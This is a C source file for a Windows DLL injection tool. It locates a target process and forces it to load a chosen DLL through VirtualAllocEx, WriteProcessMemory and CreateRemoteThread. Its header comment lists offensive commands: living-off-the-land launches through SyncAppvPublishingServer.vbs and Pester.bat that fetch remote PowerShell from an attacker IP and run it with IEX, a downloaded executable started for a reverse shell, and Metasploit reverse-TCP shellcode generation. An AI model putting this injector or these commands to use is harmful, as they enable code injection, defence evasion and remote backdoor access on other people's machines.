#include <Windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <wchar.h>
#include <stdio.h>
#include <stdlib.h>

/*
    DLL Injection technique done
        ** UPDATE: Not recommended as it registers the DLL with the process. Will show as a loaded DLL.
            Reflective DLL Injection > standard injection.

    Compiler steps for DLL
    ---------------------
    1. `cl /c displaywin44.c` - produce object file for target DLL
    2. `link /DLL /OUT:displaywin.dll displaywin44.obj`

    allows the user to run powershell when 'real time threat protection' is not enabled and 'virus protection' is enabled.
        C:\Windows\System32\SyncAppvPublishingServer.vbs "((New-Object Net.WebClient).DownloadString('http://172.22.239.186:8000/TESTVBS.ps1') | IEX)"

    allows the user to execute a target exe using the context of Pester.bat
        "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat"; start "C:\Users\Jason Todd\Desktop\testbd.exe"

    With `out of the box` default windows 10 security control settings
    DLL injection is possible through: 

        "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat" ;start "C:\Users\Jason Todd\Documents\Development\C++\WinSock2_Test\misc\dllinjector.exe"

    With 'real time protection' turned off and 'virus protection' turned on this can be used to download a remote exe file, then executed
    In this instance a TCP reverse shell can be spawned
        "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat"; powershell.exe -ep bypass -command Invoke-WebRequest -Uri 'http://172.22.239.186:8000/testbd.exe' -OutFile "%TEMP%\TARGET_SUCCESS.exe" 
        "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat"; powershell.exe -ep bypass -command start "%TEMP%\TARGET_SUCCESS.exe"

    Generate powershell shellcode (payload\windows\x64\shell\reverse_tcp)
        generate -f psh -p windows LHOST=172.22.239.186 LPORT=8888

    host shellcode on server
        python3 -m http.server

    download and execute shellcode on target
        C:\Windows\System32\SyncAppvPublishingServer.vbs "((New-Object Net.WebClient).DownloadString('http://172.22.239.186:8000/psh_backdoor.ps1') | IEX)"

    Backdoor is obtained through msfconsole
*/

#define CODE_INT 0x0
#define CODE_ARRAY 0x1

#define DLLPATH_MAGIC_BIT 0x2
#define PROCESS_TARGET_BIT 0x3

#define WRONG_PID_EXIT printf("\033[0;33m[?]\033[0;m The specified target process was not found within the process control block listing...\n\033[0;33m[?]\033[0;m Try specifying a different process name, query \"Taskmgr.exe\" if information is pertinent...\n"); exit(1);

LPWSTR returnMsgBuffer(DWORD errorCode);
DWORD enumTargetProcess(int code_type, LPWSTR procName, DWORD procID);
LPWSTR convertToLPWSTR(const char *str_target);

LPWSTR processName;

// what method will we utilize to find our target executable?
// create a generic skeleton function for this purpose, we shall start with enumerating process names,
// until we reach the desired string containing our target process 

DWORD enumTargetProcess(int code_type, LPWSTR procName, DWORD procID)
{
    int PRIMARY_FLAG = -1;

    DWORD pid = NULL;

    switch (code_type)
    {
        // code integer (22093, 113, 0, etc)
        case CODE_INT:
        {
            // set flag to obtain PID from szexe
            PRIMARY_FLAG = 0;

            break;
        }

        // character string (notepad.exe, chrome.exe, etc)
        case CODE_ARRAY:
        {
            // set flag to 
            PRIMARY_FLAG = CODE_INT + 1;

            break;
        }

        default:
        {
            // nothing to do, leave PID to system (0)
            PRIMARY_FLAG = CODE_INT;

            break;
        }
    }

    HANDLE snapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 procEntry32 = {0};
    procEntry32.dwSize = sizeof(procEntry32);

    if (Process32First(snapHandle, &procEntry32))
    {
        do
        {
            switch (PRIMARY_FLAG)
            {
                case CODE_INT:
                {
                    if (procEntry32.th32ProcessID == procID)
                    {
                        // PID exists on the system, reset to same value to verify that it is present
                        // within the PCB (Process Control Block)
                        pid = procID;

                        /* setup globally accessible process name */
                        processName = convertToLPWSTR(procEntry32.szExeFile);

                        goto CLOSE_HANDLE;
                    }
                    else 
                    {
                        continue;
                    }
                }

                case CODE_ARRAY:
                {
                    LPWSTR targetProcName = convertToLPWSTR(procEntry32.szExeFile);
                    wprintf(L"INFO :: Matching parameter 2 \"%s\" against >> %s:%d\n", procName, targetProcName, procEntry32.th32ProcessID);

                    if (wcscmp(procName, targetProcName) == 0)
                    {
                        pid = procEntry32.th32ProcessID;
                        processName = targetProcName;

                        wprintf(L"\n[\033[0;34m*\033[0;m] TARGET PID FOUND! PID=\033[0;32m%d\033[0;m, NAME=\"%s\"\n", pid, processName);
                        
                        goto CLOSE_HANDLE;
                    }
                }
            }

        } while (Process32Next(snapHandle, &procEntry32));
    }

    if ((int) pid == ((void *)0))
    {
        printf("\n");
        WRONG_PID_EXIT
    }

    CLOSE_HANDLE:

    CloseHandle(snapHandle);

    return pid;
}


LPWSTR convertToLPWSTR(const char *str_target)
{
    /* conversion operations */
    int wideLen = MultiByteToWideChar(CP_ACP, 0, str_target, -1, NULL, 0);

    if (wideLen == 0)
    {
        return ((void *)0);
    }

    /* request to allocate memory in the heap within virtual page frame */
    LPWSTR wideStr = (LPWSTR) malloc(wideLen * sizeof(WCHAR));

    if (wideStr == NULL) 
    {
        return ((void *)0);
    }

    if (MultiByteToWideChar(CP_ACP, 0, str_target, -1, wideStr, wideLen) == 0)
    {
        free(wideStr);

        return NULL;
    }

    return wideStr;
}


int main(int argc, char *argv[])
{
    int global_code = -1;

    // if argv[2] is a character array
    char *pid_name;
    const char *DllAbsPath; /* Dynamically Linked Library to load */

    DWORD targetPID = 0;
    DWORD userPID = 0;

    LPWSTR processPIDStr;
    
    if (argc == 3)
    {
        // DLL absolute path
        DllAbsPath = argv[1];
        printf("** DLL INJECTION HOST: \"%s\"\n", DllAbsPath);

        if (isdigit((int) argv[2][0]))
        {
            global_code = CODE_INT;

            // convert integer PID value to DWORD based variant data type (32 bits)
            userPID = (DWORD) atoi(argv[2]);
        }
        else
        {
            global_code = CODE_ARRAY;
            pid_name = (char *) argv[2];

            char *pid = pid_name;

            // must convert character array to LPCTSTR
            processPIDStr = convertToLPWSTR(pid);
        }
    }
    else
    {
        if (argc < 1)
        {
            char *banner = ((void *)0);
            int banner_sz = snprintf(((void *)0), 0, "%s - v2.0", argv[0]);

            banner = (char *) malloc(banner_sz * sizeof(banner));

            if (banner == (void *)0)
            {
                fprintf(stderr, "## Error - Failed to allocate enough memory for program header!\n");

                return -1;
            }

            int rc = snprintf(banner, banner_sz, "%s - v2.0", argv[0]);

            if (rc != 0)
            {
                fprintf(stderr, "## Error - Failed to call \"snprintf()\" to copy string storage buffer properly!\n");
            
                return -1;
            }

            printf("%s\n", banner);
            free(banner);

            return -1;
        }

        else if (argc < DLLPATH_MAGIC_BIT) // 2
        {
            printf("## Error - You must specify the absolute path to the host DLL!\n");

            return -1;
        }

        else if (argc < PROCESS_TARGET_BIT) // 3
        {
            printf("## Error - You must specify the target PID or the name of the remote process!\n");

            return -1;
        }
    }

    #define GTYPE_1 enumTargetProcess(global_code, 0, userPID) /* int */
    #define GTYPE_2 enumTargetProcess(global_code, processPIDStr, 0) /* LPWSTR */

    switch (global_code)
    {
        /* has integer? */
        case CODE_INT:
        {
            if ((targetPID = GTYPE_1) < 0)
            {
                WRONG_PID_EXIT
            }
            else 
            {
                break;
            }
        }

        /* has LPWSTR variant? */
        case CODE_ARRAY:
        {
            if ((targetPID = GTYPE_2) < 0)
            {
                WRONG_PID_EXIT
            }
            else 
            {
                break;
            }
        }
    }

    printf("[\033[0;34m*\033[0;m] Got target in scope of DLL injection successfully, TARGET_PID=\033[0;32m%d\033[0;m\n", targetPID);
    
    printf
    (
        "\n## Attempting process injection and custom DLL import (STANDARD DLL INJECTION) manual memory mapping technique...\n"
        "=================================================================================================================\n"
    );

    wprintf(L"\t++ Creating a process handle for \"%s\" (PID=%d)\n", processName, targetPID);
    
    // obtain a handle to the target process
    HANDLE hProcess = OpenProcess((STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | PROCESS_VM_OPERATION | 0xFFFF), FALSE, targetPID);

    printf("\t++ Allocating %zd bytes of memory into target process...\n", strlen(DllAbsPath));

    // request memory from the heap allocator, allocate virtual memory in the target process to hold the DLL path
    LPVOID lpAllocMem = VirtualAllocEx(hProcess, 0, strlen(DllAbsPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (lpAllocMem == (void *)0) // NULL
    {
        DWORD error = GetLastError();

        fwprintf(stderr, L"\n[\033[0;31m-\033[0;m] Error - Failed to call \"VirtualAllocEx()\" (MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) against target process => \"%s\"\nSYS_ERR=\"%s\"\n", 
                processName, 
                returnMsgBuffer(error)
        );

        CloseHandle(hProcess);

        return -1;
    }

    wprintf(L"\t++ Invoking write process memory against \"%s\" (PID=%d) & storing DLL path in target namespace...\n", processName, targetPID);

    SIZE_T bytesWritten = 0;
    BOOL writeProcMemory = (VARIANT_BOOL)0;

    // write the DLL path to the allocated virtual memory within the target process
    if ((writeProcMemory = WriteProcessMemory(hProcess, lpAllocMem, DllAbsPath, strlen(DllAbsPath) + 1, &bytesWritten)) == FALSE)
    {
        DWORD error = GetLastError();
        fwprintf(stderr, L"\n[\033[0;31m-\033[0;m] Error - Failed to write DLL path to allocated virtual address space of target process => \"%s\"\nERROR: %s\n", processName, returnMsgBuffer(error));

        return -1;
    }
    else 
    {
        wprintf(L"\t++ %lld bytes written to local system process \"%s\"...\n", bytesWritten, processName);
    }

    printf("\t++ Initializing manual load of \"kernel32.dll\" for DLL magic...\n");

    // get the address of the LoadLibraryA function in kernel32.dll
    HMODULE hKernel32Dll = GetModuleHandleA("kernel32.dll");

    // FARPROC = Far procedure - used where the function is located in a different area of a generic "flat memory" model than the caller
    // however FARPROC may still be used to represent function pointers that may be located in a different DLL or module than the calling program
    // it also ensures that the function pointer can correctly point to the base address of the function regardless of where it is located in memory
    
    // Loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded.
    FARPROC pfnLoadLibraryA = GetProcAddress(hKernel32Dll, "LoadLibraryA");
    printf("\t++ Building far procedure function pointer to load \"LoadLibraryA()\"\n\t\tADDRESS => @0x%p (Virtual Memory Address)\n", &pfnLoadLibraryA);

    // create a remote thread in the target process that sets the VMA to the function
    // pointer in memory that loads the DLL using LoadLibraryA
    printf("\t++ Constructing remote threads to load:\n\t\"%s\" into the target process (%ls:%d)\n\n", DllAbsPath, processName, targetPID);
    HANDLE hRemoteProcThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE) pfnLoadLibraryA, lpAllocMem, 0, 0);

    printf("\t** Waiting for remote threads to finish...\n\n");

    // wait for thread
    WaitForSingleObject(hRemoteProcThread, INFINITE);

    // close the handle to the remote thread and the target process
    CloseHandle(hRemoteProcThread);
    CloseHandle(hProcess);

    FreeLibrary(hKernel32Dll);

    printf("[\033[0;32m+\033[0;m] DONE.\n");

    return 0;
}


LPWSTR returnMsgBuffer(DWORD errorCode)
{
    LPWSTR msgBuffer = NULL;

    DWORD result = FormatMessageW
    (
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&msgBuffer,
        0,
        NULL
    );

    return msgBuffer;
}